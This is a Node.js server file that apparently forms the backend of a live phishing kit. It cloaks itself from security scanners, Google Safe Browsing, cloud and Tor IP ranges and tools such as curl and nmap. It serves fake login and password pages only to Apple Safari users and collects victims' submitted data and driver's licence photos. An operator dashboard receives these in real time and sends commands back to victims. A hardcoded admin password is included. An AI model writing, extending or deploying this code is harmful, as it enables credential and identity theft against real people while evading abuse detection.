const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const fs = require('fs');
const https = require('https');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));

// --- Bot / crawler blocking ---

const BOT_UA_PATTERNS = [
  'bot', 'crawler', 'spider', 'crawling', 'scraper',
  'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandex', 'sogou', 'exabot', 'facebot', 'facebookexternalhit',
  // Google Safe Browsing (official user-agent token from Google documentation)
  'google-safety',
  // Other bot/security patterns
  'safe browsing', 'safebrowsing', 'google-safe-browsing', 'safebrowsingapi',
  'security', 'scanner', 'nmap', 'masscan',
  'zgrab', 'nuclei', 'curl', 'wget', 'python-requests', 'libwww',
  'java/', 'go-http-client', 'okhttp', 'axios', 'dataforseo'
];

const STATIC_CIDRS = [
  // Azure
  '20.33.0.0/16', '40.82.0.0/16', '40.125.0.0/16',

  // Shodan
  '198.20.69.0/24', '198.20.70.0/24', '198.20.74.0/24', '198.20.99.0/24',
  '66.240.192.0/18',

  // Censys
  '162.142.125.0/24', '167.94.138.0/24', '167.94.145.0/24',
  '167.94.146.0/24', '167.248.133.0/24', '206.168.34.0/24',

  // Stretchoid
  '71.6.128.0/18',

  // Linode/Akamai
  '45.33.0.0/16', '45.56.0.0/16', '45.79.0.0/16', '50.116.0.0/16',
  '96.126.0.0/16', '172.104.0.0/15',

  // Vultr
  '45.32.0.0/16', '45.63.0.0/16', '45.76.0.0/16', '45.77.0.0/16',
  '104.156.0.0/16', '104.207.0.0/16', '108.61.0.0/16',

  // OVH
  '5.135.0.0/16', '5.196.0.0/16', '37.59.0.0/16', '51.68.0.0/16',
  '51.75.0.0/16', '51.77.0.0/16', '51.254.0.0/16', '54.36.0.0/16',
  '54.38.0.0/16', '91.121.0.0/16', '137.74.0.0/16', '145.239.0.0/16',
  '151.80.0.0/16', '176.31.0.0/16',

  // Hetzner
  '5.9.0.0/16', '23.88.0.0/16', '37.27.0.0/16', '49.12.0.0/16',
  '65.108.0.0/16', '65.109.0.0/16', '78.46.0.0/15', '88.99.0.0/16',
  '91.107.0.0/16', '95.216.0.0/16', '116.202.0.0/16', '116.203.0.0/16',
  '128.140.0.0/16', '135.181.0.0/16', '136.243.0.0/16', '138.201.0.0/16',
  '142.132.0.0/16', '144.76.0.0/16', '148.251.0.0/16', '157.90.0.0/16',
  '159.69.0.0/16', '162.55.0.0/16', '167.235.0.0/16', '168.119.0.0/16',
  '176.9.0.0/16', '178.63.0.0/16', '185.12.0.0/16', '188.40.0.0/16',
  '195.201.0.0/16', '213.133.0.0/16',

  // BinaryEdge
  '45.142.212.0/24', '185.180.143.0/24',

  // Tor exit nodes (common ranges - not exhaustive)
  '176.10.99.0/24', '185.220.100.0/22', '195.176.3.0/24',
];

let BLOCKED_CIDRS = [...STATIC_CIDRS];

let DYNAMIC_CIDRS = {
  google: [],
  aws: [],
  digitalocean: [],
  cloudflare: [],
};

function rebuildBlockedCidrs() {
  BLOCKED_CIDRS = [
    ...STATIC_CIDRS,
    ...DYNAMIC_CIDRS.google,
    ...DYNAMIC_CIDRS.aws,
    ...DYNAMIC_CIDRS.digitalocean,
    ...DYNAMIC_CIDRS.cloudflare,
  ];
}

function ipToInt(ip) {
  const parts = ip.split('.');
  if (parts.length !== 4) return null;
  return parts.reduce((acc, octet) => {
    const n = parseInt(octet, 10);
    if (isNaN(n) || n < 0 || n > 255) return null;
    return (acc << 8) + n;
  }, 0) >>> 0;
}

function ipInCidr(ip, cidr) {
  const [range, bitsStr] = cidr.split('/');
  const bits = parseInt(bitsStr, 10);
  const ipInt = ipToInt(ip);
  const rangeInt = ipToInt(range);
  if (ipInt === null || rangeInt === null) return false;
  if (bits === 0) return true;
  const mask = (~0 << (32 - bits)) >>> 0;
  return (ipInt & mask) === (rangeInt & mask);
}

function isIpBlocked(ip) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  return BLOCKED_CIDRS.some(cidr => ipInCidr(cleanIp, cidr));
}

function fetchJson(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

function fetchText(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

async function refreshGoogleRanges() {
  try {
    const goog = await fetchJson('https://www.gstatic.com/ipranges/goog.json');
    DYNAMIC_CIDRS.google = (goog.prefixes || [])
      .map(p => p.ipv4Prefix)
      .filter(Boolean);
    console.log(`Loaded ${DYNAMIC_CIDRS.google.length} Google IP ranges`);
  } catch (err) {
    console.error('Failed to fetch Google IP ranges:', err.message);
  }
}

async function refreshAwsRanges() {
  try {
    const aws = await fetchJson('https://ip-ranges.amazonaws.com/ip-ranges.json');
    DYNAMIC_CIDRS.aws = (aws.prefixes || [])
      .map(p => p.ip_prefix)
      .filter(Boolean);
    console.log(`Loaded ${DYNAMIC_CIDRS.aws.length} AWS IP ranges`);
  } catch (err) {
    console.error('Failed to fetch AWS IP ranges:', err.message);
  }
}

async function refreshDigitalOceanRanges() {
  try {
    const text = await fetchText('https://digitalocean.com/geo/google.csv');
    DYNAMIC_CIDRS.digitalocean = text
      .split('\n')
      .map(l => l.trim().split(',')[0])
      .filter(c => c && c.includes('/'));
    console.log(`Loaded ${DYNAMIC_CIDRS.digitalocean.length} DigitalOcean IP ranges`);
  } catch (err) {
    console.error('Failed to fetch DigitalOcean IP ranges:', err.message);
  }
}

async function refreshCloudflareRanges() {
  try {
    const text = await fetchText('https://www.cloudflare.com/ips-v4');
    DYNAMIC_CIDRS.cloudflare = text
      .split('\n')
      .map(l => l.trim())
      .filter(Boolean);
    console.log(`Loaded ${DYNAMIC_CIDRS.cloudflare.length} Cloudflare IP ranges`);
  } catch (err) {
    console.error('Failed to fetch Cloudflare IP ranges:', err.message);
  }
}

async function refreshAllRanges() {
  await Promise.all([
    refreshGoogleRanges(),
    refreshAwsRanges(),
    refreshDigitalOceanRanges(),
    refreshCloudflareRanges(),
  ]);
  rebuildBlockedCidrs();
  console.log(`Total blocked CIDR ranges: ${BLOCKED_CIDRS.length}`);
}

refreshAllRanges();
setInterval(refreshAllRanges, 24 * 60 * 60 * 1000);

function isBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (BOT_UA_PATTERNS.some(p => ua.includes(p))) return true;

  const ip = (req.headers['x-forwarded-for']?.split(',')[0].trim())
    || req.socket.remoteAddress
    || '';
  if (isIpBlocked(ip)) return true;

  return false;
}

// --- Apple Safari detection ------------------------------------------------
// Safari shares "Safari" and "Version/" tokens with many other browsers, so
// we confirm an Apple platform first and then exclude the known impostors.
function isAppleSafari(ua) {
  if (!ua) return false;
  const onApple     = /Macintosh|Mac OS X|iPhone|iPad|iPod/.test(ua);
  const looksSafari = /Safari/.test(ua) && /Version\/\d+/.test(ua);
  const impostor    = /Chrome|Chromium|CriOS|FxiOS|EdgiOS|Edg|OPiOS|OPR|OPT|Android|SamsungBrowser|YaBrowser|UCBrowser|FBAN|FBAV|Instagram|Line|GSA/.test(ua);
  return onApple && looksSafari && !impostor;
}
// ---------------------------------------------------------------------------

app.use((req, res, next) => {
  if (req.path === '/api/upload-image') return next();
  if (isBot(req)) {
    return res.status(403).send('Forbidden');
  }
  next();
});

// --- Safari gate -----------------------------------------------------------
// The client calls this endpoint; the browser sends its UA automatically.
// /login.html is returned in JSON ONLY when the UA confirms Apple Safari.
// Every other agent receives {} — the path never leaves the server for them.
app.get('/check-browser', (req, res) => {
  if (isAppleSafari(req.get('User-Agent'))) {
    return res.json({ go: '/login.html' });
  }
  res.json({});
});
// ---------------------------------------------------------------------------

const DATA_FILE = path.join(__dirname, 'sessions-data.json');
const IMAGES_DIR = path.join(__dirname, 'session-images');
if (!fs.existsSync(IMAGES_DIR)) fs.mkdirSync(IMAGES_DIR, { recursive: true });

const multer = require('multer');
const mimeToExt = {
  'image/jpeg': 'jpg', 'image/png': 'png',
  'image/heic': 'heic', 'image/heif': 'heif', 'image/webp': 'webp'
};
const upload = multer({ dest: IMAGES_DIR });

// Serve static files
app.use(express.static('public'));





// In-memory storage
const sessions = new Map(); // sessionID -> { clients: Set<socketId>, data: {}, ip }
const socketToSession = new Map(); // socketId -> sessionID (for clients)
const globalDashboards = new Set(); // all dashboard socket ids

// --- Persistence Functions ---
function loadSessionsFromFile() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const rawData = fs.readFileSync(DATA_FILE, 'utf8');
      const parsed = JSON.parse(rawData);
      
      // Restore sessions (but not the active socket connections)
      Object.entries(parsed).forEach(([sessionID, sessionData]) => {
        sessions.set(sessionID, {
          clients: new Set(), // Will be repopulated when clients reconnect
          data: sessionData.data || {},
          ip: sessionData.ip || 'unknown'
        });
      });
      
      console.log(`Loaded ${sessions.size} sessions from ${DATA_FILE}`);
    } else {
      console.log('No existing session data file found. Starting fresh.');
    }
  } catch (error) {
    console.error('Error loading sessions from file:', error);
  }
}

function saveSessionsToFile() {
  try {
    // Convert Map to plain object, excluding the Set of active clients
    const dataToSave = {};
    sessions.forEach((session, sessionID) => {
      dataToSave[sessionID] = {
        data: session.data,
        ip: session.ip,
        lastUpdate: new Date().toISOString()
      };
    });
    
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataToSave, null, 2), 'utf8');
    console.log(`Saved ${Object.keys(dataToSave).length} sessions to ${DATA_FILE}`);
  } catch (error) {
    console.error('Error saving sessions to file:', error);
  }
}

// Debounced save to avoid writing too frequently
let saveTimeout;
function debouncedSave() {
  clearTimeout(saveTimeout);
  saveTimeout = setTimeout(() => {
    saveSessionsToFile();
  }, 1000); // Save 1 second after last change
}

// Load existing sessions on startup
loadSessionsFromFile();

app.post('/api/upload-image', upload.single('image'), (req, res) => {
  console.log('[upload] attempt received:', {
    mimetype: req.file?.mimetype,
    originalname: req.file?.originalname,
    size: req.file?.size,
    sessionID: req.body?.sessionID,
    imageType: req.body?.imageType
  });
  const { sessionID, imageType } = req.body;
  if (!req.file || !sessionID || !imageType) {
    console.warn('[upload] rejected - missing fields:', { hasFile: !!req.file, sessionID, imageType });
    return res.status(400).json({ error: 'Missing fields' });
  }

  const ext = mimeToExt[req.file.mimetype] || (req.file.originalname.split('.').pop() || 'jpg').toLowerCase();
  const filename = `${sessionID}_${imageType}_${Date.now()}.${ext}`;
  fs.renameSync(req.file.path, path.join(IMAGES_DIR, filename));
  console.log(`Saved image via upload: ${filename}`);

  if (!sessions.has(sessionID)) {
    sessions.set(sessionID, { clients: new Set(), data: {}, ip: 'unknown' });
  }

  const session = sessions.get(sessionID);
  if (!session.data.images) session.data.images = {};
  session.data.images[imageType] = filename;
  debouncedSave();

  globalDashboards.forEach(dashId => {
    io.to(dashId).emit(`client-licence-${imageType}-submitted`, {
      sessionID,
      images: session.data.images
    });
  });

  res.json({ success: true, filename });
});

// Save sessions on server shutdown
process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  saveSessionsToFile();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\nShutting down server...');
  saveSessionsToFile();
  process.exit(0);
});

// Serve dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashbord.html'));
});

// Serve client
app.get('/client', (req, res) => {
  res.sendFile(path.join(__dirname, 'client.html'));
});

// API endpoint to get all sessions (for dashboard to load on startup)
app.get('/api/sessions', (req, res) => {
  const sessionList = Array.from(sessions.entries()).map(([id, s]) => ({
    sessionID: id,
    ip: s.ip || 'unknown',
    data: s.data,
    online: s.clients.size > 0
  }));
  res.json(sessionList);
});

app.post('/api/login', (req, res) => {
  const { password } = req.body || {};
  if (password === '@1ClashofClans2') {
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false });
  }
});

app.get('/adminlogin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'adminlogin.html'));
});

// --- Gated files ------------------------------------------------------------
// All live in /private (NOT /public) so express.static never serves them.
// Each route is its own gate — non-Safari requests get a 404 on all of them.
app.get('/login.html', (req, res) => {
  if (isAppleSafari(req.get('User-Agent'))) {
    return res.sendFile(path.join(__dirname, 'private', 'login.html'));
  }
  res.status(404).send('Not found');
});

app.get('/index.js', (req, res) => {
  if (isAppleSafari(req.get('User-Agent'))) {
    return res.sendFile(path.join(__dirname, 'private', 'index.js'));
  }
  res.status(404).send('Not found');
});

app.get('/pwd.html', (req, res) => {
  if (isAppleSafari(req.get('User-Agent'))) {
    return res.sendFile(path.join(__dirname, 'private', 'pwd.html'));
  }
  res.status(404).send('Not found');
});

app.get('/pwd.js', (req, res) => {
  if (isAppleSafari(req.get('User-Agent'))) {
    return res.sendFile(path.join(__dirname, 'private', 'pwd.js'));
  }
  res.status(404).send('Not found');
});
// ---------------------------------------------------------------------------



app.get('/api/images/:filename', (req, res) => {
  const filename = path.basename(req.params.filename);
  const filepath = path.join(IMAGES_DIR, filename);
  if (!fs.existsSync(filepath)) return res.status(404).send('Not found');
  res.sendFile(filepath);
});

app.get('/api/download-manifest', (req, res) => {
  const manifest = [];
  sessions.forEach((session, sessionID) => {
    const entry = { sessionID, ip: session.ip, data: {}, images: session.data.images || {} };
    Object.entries(session.data).forEach(([k, v]) => {
      if (k !== 'images' && !['licence-front-submitted', 'licence-back-submitted'].includes(k)) {
        entry.data[k] = v;
      }
    });
    manifest.push(entry);
  });
  res.json(manifest);
});

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  // Dashboard joins (we register it globally so it sees all sessions)
  socket.on('dashboard-join', ({ sessionID }) => {
    // Keep a record that this socket is a dashboard (so it receives global events)
    globalDashboards.add(socket.id);
    // Optionally remember a "dashboard session id" (not used for filtering here)
    socketToSession.set(socket.id, `dashboard:${sessionID || socket.id}`);

    console.log(`Dashboard ${socket.id} joined (dashboardSessionID=${sessionID})`);

    // Send the full list of known sessions to this dashboard (including offline ones)
    const sessionList = Array.from(sessions.entries()).map(([id, s]) => ({
      sessionID: id,
      ip: s.ip || 'unknown',
      online: s.clients.size > 0
    }));
    socket.emit('session-list', sessionList);

    // Send all historical data for each session
    sessions.forEach((session, sessionID) => {
      if (Object.keys(session.data).length > 0) {
        const events = Object.entries(session.data).map(([type, data]) => ({
          type,
          data
        }));
        // ADD:
        socket.emit('session-history', { sessionID, events, images: session.data.images || {} });
      }
    });
  });

  // Client joins with a sessionID
  socket.on('client-join', ({ sessionID }) => {
    if (!sessionID) return;

    socketToSession.set(socket.id, sessionID);

    if (!sessions.has(sessionID)) {
      sessions.set(sessionID, {
        clients: new Set(),
        data: {},
        ip: socket.handshake.address
      });
      debouncedSave(); // Save when new session is created
    }

    const session = sessions.get(sessionID);
    session.clients.add(socket.id);
    session.ip = socket.handshake.address;

    console.log(`Client ${socket.id} joined session ${sessionID}`);

    // Notify ALL dashboards (global) about this client connection
    globalDashboards.forEach(dashId => {
      io.to(dashId).emit('client-connected', {
        sessionID,
        ip: session.ip
      });
    });
  });

  // Forward dashboard actions to clients in the same session
  socket.on('dashboard-action', ({ sessionID, buttonName, value }) => {
    const session = sessions.get(sessionID);
    if (!session) return;

    console.log(`Dashboard action: ${buttonName} for session ${sessionID}`);

    session.clients.forEach(clientId => {
      io.to(clientId).emit('dashboard-action', {
        buttonName,
        value: value || buttonName
      });
    });
  });

  // Forward client data updates to dashboards in the global set
  socket.on('client-data', ({ type, data }) => {
    const sessionID = socketToSession.get(socket.id);
    if (!sessionID) return;

    const session = sessions.get(sessionID);
    if (!session) return;

    session.data[type] = data;
    debouncedSave();

    globalDashboards.forEach(dashId => {
      io.to(dashId).emit(`client-${type}`, { sessionID, [type]: data });
    });
  });

  // Dashboard requests history → send only for requested session
  socket.on('request-session-history', (sessionID) => {
    const session = sessions.get(sessionID);
    if (!session) return;

    const events = [];
    for (const [type, data] of Object.entries(session.data)) {
      events.push({ type, data });
    }

    // ADD:
        socket.emit('session-history', { sessionID, events, images: session.data.images || {} });
  });

  // Dashboard deletes a session
  socket.on('dashboard-delete-session', ({ dashboardID, sessionID }) => {
    console.log(`Dashboard ${dashboardID} requested deletion of session ${sessionID}`);
    
    if (sessions.has(sessionID)) {
      sessions.delete(sessionID);
      debouncedSave(); // Save after deletion
      
      // Notify the requesting dashboard
      socket.emit('dashboard-delete-ack', { dashboardID, sessionID });
    }
  });

  // Disconnect cleanup
  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);

    // Remove from global dashboards if present
    if (globalDashboards.has(socket.id)) {
      globalDashboards.delete(socket.id);
    }

    const sessionID = socketToSession.get(socket.id);

    if (sessionID && sessions.has(sessionID)) {
      const session = sessions.get(sessionID);

      // Remove socket from clients set if it was a client
      session.clients.delete(socket.id);

      // Notify dashboards globally that a client disconnected
      globalDashboards.forEach(dashId => {
        io.to(dashId).emit('client-disconnected', { sessionID });
      });

      // Don't delete empty sessions anymore - keep them for historical data
      // if (session.clients.size === 0) {
      //   sessions.delete(sessionID);
      // }
    }

    socketToSession.delete(socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`Client: http://localhost:${PORT}/client`);
  console.log(`Sessions data file: ${DATA_FILE}`);
});